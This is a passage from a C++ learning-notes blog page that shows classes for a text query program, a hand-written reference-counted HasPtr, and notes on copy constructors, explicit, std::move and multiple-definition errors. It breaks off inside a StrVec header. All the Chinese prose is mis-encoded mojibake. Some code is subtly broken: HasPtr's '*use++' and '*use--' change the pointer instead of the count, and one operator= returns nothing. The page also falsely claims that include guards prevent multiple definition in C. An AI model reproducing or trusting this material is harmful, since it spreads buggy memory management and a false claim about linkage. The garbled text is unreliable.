class="line"></span><br><span class="line">        cur++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TextQuery::getword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> iter=<span class="keyword">this</span>-&gt;word.<span class="built_in">begin</span>();</span><br><span class="line">    <span class="keyword">while</span>(iter!=<span class="keyword">this</span>-&gt;word.<span class="built_in">end</span>())&#123;</span><br><span class="line">        std::cout&lt;&lt;iter-&gt;first&lt;&lt;<span class="string">&quot;  &quot;</span>;</span><br><span class="line">        <span class="keyword">auto</span> tmp=iter-&gt;second-&gt;<span class="built_in">begin</span>();</span><br><span class="line">        <span class="keyword">while</span>(tmp!=iter-&gt;second-&gt;<span class="built_in">end</span>())&#123;</span><br><span class="line">            std::cout&lt;&lt;*tmp&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            tmp++;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout&lt;&lt;std::endl;</span><br><span class="line">        iter++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">QueryResult <span class="title">TextQuery::query</span><span class="params">(std::string user_word)</span></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> word_set=<span class="keyword">this</span>-&gt;word[user_word];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">QueryResult</span>(user_word,word_set,<span class="keyword">this</span>-&gt;file_context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>QueryResult.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INC_1_QUERYRESULT_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INC_1_QUERYRESULT_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueryResult</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> std::ostream&amp; <span class="title">print</span><span class="params">(std::ostream &amp;os, QueryResult &amp;qr)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::string word;</span><br><span class="line">    std::shared_ptr&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt; word_set;</span><br><span class="line">    std::shared_ptr&lt;std::vector&lt;std::string&gt;&gt; file_count;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">QueryResult</span>(std::string word,std::shared_ptr&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt; word_set,std::shared_ptr&lt;std::vector&lt;std::string&gt;&gt; file_count)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;word=word;</span><br><span class="line">        <span class="keyword">this</span>-&gt;word_set=word_set;</span><br><span class="line">        <span class="keyword">this</span>-&gt;file_count=file_count;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//INC_1_QUERYRESULT_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>QueryResult.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;QueryResult.h&quot;</span></span></span><br><span class="line"><span class="function">std::ostream&amp; <span class="title">print</span><span class="params">(std::ostream &amp;os,QueryResult &amp;qr)</span></span>&#123;</span><br><span class="line">    os&lt;&lt;qr.word&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;<span class="string">&quot;occurs &quot;</span>&lt;&lt;qr.word_set-&gt;<span class="built_in">size</span>()&lt;&lt;<span class="string">&quot; times&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">auto</span> iter=qr.word_set-&gt;<span class="built_in">begin</span>();</span><br><span class="line">    <span class="keyword">while</span>(iter!=qr.word_set-&gt;<span class="built_in">end</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> line_num=*iter+<span class="number">1</span>;</span><br><span class="line">        os&lt;&lt;<span class="string">&quot;(line &quot;</span>&lt;&lt;line_num&lt;&lt;<span class="string">&quot;)&quot;</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(*qr.file_count)[*iter]&lt;&lt;std::endl;</span><br><span class="line">        iter++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•´ä½“æ¥è¯´ä¸æ˜¯å¾ˆéš¾ï¼Œä¸»è¦è®°å½•ä¸€ä¸‹è¿™äº›æ ‡å‡†åº“çš„ä¸»è¦ç”¨æ³•ã€‚</p>
<h2 id="æ‹·è´æ„é€ å‡½æ•°çš„å‚æ•°é—®é¢˜"><a href="#æ‹·è´æ„é€ å‡½æ•°çš„å‚æ•°é—®é¢˜" class="headerlink" title="æ‹·è´æ„é€ å‡½æ•°çš„å‚æ•°é—®é¢˜"></a>æ‹·è´æ„é€ å‡½æ•°çš„å‚æ•°é—®é¢˜</h2><p>æ‹·è´æ„é€ å‡½æ•°çš„å‚æ•°åªèƒ½è¿™ä¸ªç±»çš„å¯¹è±¡çš„å¼•ç”¨ä¸èƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå› ä¸ºå½“æ‹·è´æ„é€ å‡½æ•°å½¢å‚æ˜¯ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œé‚£å‘ç”Ÿæ‹·è´çš„æ—¶å€™å°±ä¼šè°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼Œè€Œæ‹·è´æ„é€ å‡½æ•°ä¹Ÿä¼šå‘ç”Ÿæ‹·è´ï¼Œæ‰€ä»¥åˆä¼šè°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼Œè¿™å°±é€ æˆäº†æ­»å¾ªç¯äº†ã€‚è¿™ä¸ªæ‹·è´æ„é€ å‡½æ•°æ°¸è¿œæ²¡æœ‰åŠæ³•è°ƒç”¨æˆåŠŸã€‚</p>
<p>æ³¨æ„å‚æ•°ä¸ä»…æ˜¯å¼•ç”¨ï¼Œå¦‚æœè¦ä½¿ç”¨å®¹å™¨å¯¹å¯¹è±¡è¿›è¡Œå­˜å‚¨çš„è¯ï¼Œå¿…é¡»å¾—å­˜åœ¨ä¸€ä¸ªconstå¼•ç”¨çš„æ„é€ å‡½æ•°ï¼ŒåŸå› åº”è¯¥è¿˜æ˜¯éconstå¼•ç”¨æ²¡åŠæ³•æ¥æ”¶ä¸´æ—¶å˜é‡ã€‚</p>
<p>æ‰€ä»¥æ‹·è´æ„é€ å‡½æ•°æœ€å¥½æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¸€ä¸ªconstå¼•ç”¨ä¸€ä¸ªéconstå¼•ç”¨ï¼ˆæˆ‘çš„ç†è§£ï¼‰ã€‚</p>
<h2 id="explicit"><a href="#explicit" class="headerlink" title="explicit"></a>explicit</h2><p>ç¼–è¯‘å™¨å¯ä»¥è‡ªåŠ¨éšå¼çš„è¿›è¡Œä¸€æ­¥ç±»å‹è½¬æ¢ï¼Œä½†åªèƒ½è¿›è¡Œä¸€æ­¥,æ¯”å¦‚ä¸‹é¢ä»£ç </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="built_in">A</span>(string s);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(A a)</span></span>;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¿™æ ·<code>fun(&quot;123&quot;)</code>,å°±ä¼šå‘æˆé”™è¯¯ï¼Œå› ä¸ºç¼–è¯‘å™¨åªèƒ½è‡ªåŠ¨éšå¼çš„è¿›è¡Œä¸€æ­¥ç±»å‹è½¬æ¢ï¼Œæ¯”å¦‚æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆstringæˆ–è€…æŠŠstringè½¬æ¢æˆclass A,ä½†æ˜¯ä¸èƒ½è‡ªåŠ¨è¿›è¡Œä¸¤æ­¥è½¬åŒ–ï¼Œ<code>fun(&quot;123&quot;)</code>å°±æ˜¯ä¸¤æ­¥è½¬åŒ–ï¼Œæ­£ç¡®çš„æ–¹å¼å¯ä»¥æ˜¯è¿™æ ·<code>fun(string(&quot;123&quot;))</code>æˆ–è€…<code>fun(A(&quot;123&quot;))</code>ã€‚</p>
<p>è¿™ç¡®å®å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯æœ‰æ—¶å€™ç¨‹åºå‘˜å¹¶ä¸æƒ³è¿›è¡Œè¿™ç§è‡ªåŠ¨è½¬åŒ–ï¼Œé‚£å°±å¯ä»¥ä½¿ç”¨<strong>explicit</strong>è¿›è¡Œé™åˆ¶ï¼Œæ¯”å¦‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">A</span><span class="params">(string s)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(A a)</span></span>;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å†è°ƒç”¨<code>fun(string(&quot;123&quot;))</code>å°±ä¼šå‘ç”Ÿé”™è¯¯ï¼Œå› ä¸ºç¦æ­¢ä»stringè½¬åŒ–æˆclass Aäº†ã€‚</p>
<h2 id="æ‹·è´åˆå§‹åŒ–"><a href="#æ‹·è´åˆå§‹åŒ–" class="headerlink" title="æ‹·è´åˆå§‹åŒ–"></a>æ‹·è´åˆå§‹åŒ–</h2><p>æ‹·è´åˆå§‹åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°æˆ–è€…ç§»åŠ¨æ„é€ å‡½æ•°ã€‚</p>
<p>ç›´æ¥åˆå§‹åŒ–å’Œæ‹·è´åˆå§‹åŒ–è¿˜æ˜¯æœ‰å¾ˆå¤§åŒºåˆ«çš„ï¼Œç›´æ¥åˆå§‹åŒ–æŒ‡è°ƒç”¨æ„é€ å‡½æ•°å®Œæˆå¯¹è±¡çš„åˆå§‹åŒ–å·¥ä½œï¼Œæ‹·è´åˆå§‹åŒ–æ˜¯æŒ‡å½“å¯¹è±¡å‘ç”Ÿæ‹·è´çš„æ—¶å€™è¢«åŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°æˆ–è€…ç§»åŠ¨æ„é€ å‡½æ•°ã€‚</p>
<h2 id="æ‹·è´æ„é€ å‡½æ•°å’Œæ‹·è´èµ‹å€¼è¿ç®—ç¬¦çš„åŒºåˆ«"><a href="#æ‹·è´æ„é€ å‡½æ•°å’Œæ‹·è´èµ‹å€¼è¿ç®—ç¬¦çš„åŒºåˆ«" class="headerlink" title="æ‹·è´æ„é€ å‡½æ•°å’Œæ‹·è´èµ‹å€¼è¿ç®—ç¬¦çš„åŒºåˆ«"></a>æ‹·è´æ„é€ å‡½æ•°å’Œæ‹·è´èµ‹å€¼è¿ç®—ç¬¦çš„åŒºåˆ«</h2><p>ä¸»è¦åŒºåˆ«å°±æ˜¯ä»–ä»¬è°ƒç”¨çš„æ—¶æœºä¸åŒï¼Œæ¯”å¦‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line">    <span class="built_in">A</span>()&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;asd&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">A</span>(A &amp;a)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;123&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;;</span><br><span class="line">    A&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> A&amp;)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;234&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¿™æ ·</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    A c=a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£å°±æ˜¯è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼Œè¾“å‡º123,é‚£æ˜¯å› ä¸ºæ­¤æ—¶æ˜¯åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™å‘ç”Ÿæ‹·è´è¡Œä¸ºï¼Œå°±ä¼šè°ƒç”¨æ‹·è´æ„é€ å‡½æ•°</p>
<p>å¦‚æœè¿™æ ·</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A a,c;</span><br><span class="line">    c=a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å•çº¯çš„æŠŠä¸€ä¸ªå·²ç»åˆå§‹åŒ–çš„å¯¹è±¡èµ‹å€¼ç»™å¦ä¸€ä¸ªå·²ç»åˆå§‹åŒ–çš„å¯¹è±¡å°±ä¼šè°ƒç”¨æ‹·è´èµ‹å€¼è¿ç®—ç¬¦ã€‚</p>
<p>æ‰€ä»¥ä¸ºäº†ä¸€ä¸ªç±»çš„å¥å£®æ€§ï¼Œå»ºè®®ä¸¤è€…éƒ½å¾—æœ‰ã€‚</p>
<h2 id="å°è®°"><a href="#å°è®°" class="headerlink" title="å°è®°"></a>å°è®°</h2><p>c++å¤ªææ€–äº†ï¼Œå¤ªå¤šç»†èŠ‚äº†ã€‚</p>
<h2 id="æ™ºèƒ½æŒ‡é’ˆçš„ç®€å•å®ç°"><a href="#æ™ºèƒ½æŒ‡é’ˆçš„ç®€å•å®ç°" class="headerlink" title="æ™ºèƒ½æŒ‡é’ˆçš„ç®€å•å®ç°"></a>æ™ºèƒ½æŒ‡é’ˆçš„ç®€å•å®ç°</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasPtr</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(HasPtr &amp;,HasPtr &amp;)</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">HasPtr</span>(<span class="keyword">int</span> i,<span class="keyword">const</span> string &amp;s= <span class="built_in">string</span>()):<span class="built_in">ptr</span>(<span class="keyword">new</span> <span class="built_in">string</span>(s)),<span class="built_in">i</span>(i),<span class="built_in">use</span>(<span class="keyword">new</span> <span class="built_in">size_t</span>(<span class="number">1</span>))&#123;&#125;;</span><br><span class="line">    <span class="built_in">HasPtr</span>(<span class="keyword">const</span> HasPtr &amp;hasptr):<span class="built_in">ptr</span>(hasptr.ptr),<span class="built_in">i</span>(hasptr.i),<span class="built_in">use</span>(hasptr.use)&#123;</span><br><span class="line">        *use++;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">HasPtr</span>(HasPtr &amp;hasptr):<span class="built_in">ptr</span>(hasptr.ptr),<span class="built_in">i</span>(hasptr.i),<span class="built_in">use</span>(hasptr.use)&#123;</span><br><span class="line">        *use++;</span><br><span class="line">    &#125;;</span><br><span class="line">    HasPtr&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> HasPtr &amp;hasptr)&#123;</span><br><span class="line">        (*hasptr.use)++;</span><br><span class="line">        *use--;</span><br><span class="line">        <span class="keyword">if</span>(*use==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">delete</span> use;</span><br><span class="line">            <span class="keyword">delete</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr=hasptr.ptr;</span><br><span class="line">        use=hasptr.use;</span><br><span class="line">        i=hasptr.i;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(HasPtr &amp;hp)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;hp.i)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">string&amp; <span class="title">getstring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">this</span>-&gt;ptr);</span><br><span class="line">    &#125;;</span><br><span class="line">    ~<span class="built_in">HasPtr</span>()&#123;</span><br><span class="line">        *use--;</span><br><span class="line">        <span class="keyword">if</span>(*use==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">delete</span> use;</span><br><span class="line">            <span class="keyword">delete</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">size_t</span> *use;</span><br><span class="line">    string *ptr;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(HasPtr &amp;lhs,HasPtr &amp;rhs)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hp swap&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">swap</span>(lhs.use,rhs.use);</span><br><span class="line">    <span class="built_in">swap</span>(lhs.ptr,rhs.ptr);</span><br><span class="line">    <span class="built_in">swap</span>(lhs.i,rhs.i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="constå¯¹è±¡åªèƒ½è°ƒç”¨constæˆå‘˜å‡½æ•°"><a href="#constå¯¹è±¡åªèƒ½è°ƒç”¨constæˆå‘˜å‡½æ•°" class="headerlink" title="constå¯¹è±¡åªèƒ½è°ƒç”¨constæˆå‘˜å‡½æ•°"></a>constå¯¹è±¡åªèƒ½è°ƒç”¨constæˆå‘˜å‡½æ•°</h2><p>å› ä¸ºè¦ä¿è¯å¯¹è±¡çš„constå±æ€§.</p>
<h2 id="std-move"><a href="#std-move" class="headerlink" title="std::move"></a>std::move</h2><p>æ ‡å‡†åº“å‡½æ•°ï¼Œèƒ½å¤Ÿæ˜¾ç¤ºè°ƒç”¨å¯¹è±¡çš„ç§»åŠ¨æ„é€ å‡½æ•°ã€‚</p>
<p>æ¯”å¦‚ä¸‹é¢çš„ä»£ç </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string s1=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="function">string <span class="title">s2</span><span class="params">(move(s1))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯å°†s1ç§»åŠ¨åˆ°äº†s2,ç§»åŠ¨ås1ä¾ç„¶å¯ä»¥æ­£å¸¸ææ„ï¼Œä½†æ˜¯æ­¤æ—¶s1ä¸å†æŒ‡å‘â€123â€çš„å­—ç¬¦ä¸²äº†ï¼Œs2å°†æŒ‡å‘â€123â€çš„å­—ç¬¦ä¸²ã€‚</p>
<h2 id="multiple-definition-å¤šé‡å®šä¹‰é—®é¢˜"><a href="#multiple-definition-å¤šé‡å®šä¹‰é—®é¢˜" class="headerlink" title="multiple definition å¤šé‡å®šä¹‰é—®é¢˜"></a>multiple definition å¤šé‡å®šä¹‰é—®é¢˜</h2><p>åœ¨c++ä¸­åˆ‡è®°åˆ‡è®°ä¸è¦åœ¨å¤´æ–‡ä»¶ä¸­å®šä¹‰å…¨å±€å˜é‡æˆ–è€…å‡½æ•°ï¼Œå› ä¸ºå¦‚æœè¿™ä¸ªå¤´æ–‡ä»¶è¢«å¤šä¸ªcppæ–‡ä»¶å¼•ç”¨ç»å¯¹ä¼šçˆ†multiple definitionè¿™ä¸ªé”™ã€‚</p>
<p>å¦‚æœåœ¨å¤´æ–‡ä»¶ä¸­å®šä¹‰äº†å˜é‡ï¼ˆæ˜¯å®šä¹‰ä¸æ˜¯å£°æ˜ï¼‰ï¼Œå¹¶åˆ†åˆ«åœ¨a.cå’Œb.cä¸­è¿›è¡Œäº†å¼•ç”¨ï¼Œç¼–è¯‘è¿‡ç¨‹ä¸­è¿™ä¸ªå˜é‡çš„ç¬¦å·ä¼šåŒæ—¶åŒ…å«åœ¨a.oå’Œb.oä¸­ï¼Œå¯¼è‡´é“¾æ¥å¤±è´¥ï¼ŒåŸå› æ˜¯Cè¯­è¨€è§„å®šâ€œä¸€ä¸ªå˜é‡å¯ä»¥å¤šæ¬¡å£°æ˜ä½†åªèƒ½å®šä¹‰ä¸€æ¬¡â€ï¼Œè§£å†³åŠæ³•æ˜¯åœ¨å¤´æ–‡ä»¶ä¸­åŠ ä¸Š#ifndef Xæ¡ä»¶ç¼–è¯‘ï¼Œä½¿è¯¥å˜é‡åªå®šä¹‰ä¸€æ¬¡ï¼Œä½†æ˜¯è¿™é‡Œåˆæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œè¯¥è§£å†³åŠæ³•åªé€‚ç”¨Cè€Œä¸é€‚ç”¨C++ï¼Œåœ¨C++ä¸­ï¼Œå³ä½¿åœ¨å¤´æ–‡ä»¶ä¸­åŠ äº†#ifndef Xï¼Œé“¾æ¥é”™è¯¯åŒæ ·ä¼šå‘ç”Ÿï¼ŒåŸå› æ˜¯C++ä¸­#ifndef Xçš„ä½œç”¨åŸŸ<strong>ä»…åœ¨å•ä¸ªæ–‡ä»¶ä¸­</strong>ï¼Œå› æ­¤åªè¦åœ¨.hä¸­å®šä¹‰äº†å˜é‡å¹¶åœ¨ä¸åŒ.cppä¸­è¿›è¡Œå¼•ç”¨ï¼Œé“¾æ¥æ—¶éƒ½ä¼šæŠ¥é‡å®šä¹‰é”™è¯¯ï¼Œå†è¯´å¾—ç›´ç™½ç‚¹ï¼Œa.cppå’Œb.cppéƒ½å¼•ç”¨äº†æ¡ä»¶ç¼–è¯‘çš„g.hï¼Œg.hçš„æ¡ä»¶ç¼–è¯‘åªèƒ½åˆ†åˆ«ä¿è¯åœ¨a.cppå’Œb.cppä¸­ä¸å‡ºç°é‡å¤å®šä¹‰ï¼Œä½†åœ¨é“¾æ¥a.oå’Œb.oçš„è¿‡ç¨‹ä¸­å°±ä¼šå‘ç°é‡å¤å®šä¹‰ã€‚</p>
<p>c++è¿™æ ·åšæˆ‘ç†è§£æ˜¯æ›´åŠ ç»†ç²’åº¦å˜é‡çš„ä½œç”¨åŸŸï¼Œå˜é‡åªå±äºæŸä¸€ä¸ªæ¨¡å—è€Œä¸æ˜¯æ•´ä¸ªç¨‹åºï¼Œå¦‚æœä¸€ä¸ªæ¨¡å—æƒ³ä½¿ç”¨å¦ä¸€ä¸ªæ¨¡å—çš„æŸä¸€ä¸ªå˜é‡å°±å¾—ä½¿ç”¨<code>extern</code>è¿™ä¸ªå…³é”®å­—</p>
<p>externå¯ä»¥ç½®äºå˜é‡æˆ–è€…å‡½æ•°å‰ï¼Œä»¥æ ‡ç¤ºå˜é‡æˆ–è€…å‡½æ•°çš„å®šä¹‰åœ¨åˆ«çš„æ–‡ä»¶ä¸­ï¼Œæç¤ºç¼–è¯‘å™¨é‡åˆ°æ­¤å˜é‡å’Œå‡½æ•°æ—¶åœ¨å…¶ä»–æ¨¡å—ä¸­å¯»æ‰¾å…¶å®šä¹‰ã€‚è¦ä½¿ç”¨å…¶ä»–æ¨¡å—çš„å˜é‡åªè¦åœ¨è¿™ä¸ªæ¨¡å—ä¸­ä½¿ç”¨<code>extern å˜é‡å£°æ˜</code>å°±å¯ä»¥äº†ã€‚</p>
<h2 id="StrVecç®€å•å®ç°"><a href="#StrVecç®€å•å®ç°" class="headerlink" title="StrVecç®€å•å®ç°"></a>StrVecç®€å•å®ç°</h2><p>.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INC_1_STRVEC_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INC_1_STRVEC_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span 